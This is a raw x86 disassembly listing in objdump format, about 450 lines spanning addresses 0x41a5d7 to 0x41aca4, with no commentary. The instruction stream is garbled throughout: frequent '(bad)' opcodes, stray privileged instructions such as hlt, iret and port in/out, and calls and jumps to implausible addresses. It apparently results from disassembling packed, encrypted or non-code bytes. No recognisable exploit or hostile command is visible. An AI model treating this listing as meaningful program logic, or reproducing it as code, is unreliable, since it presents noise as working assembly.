  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
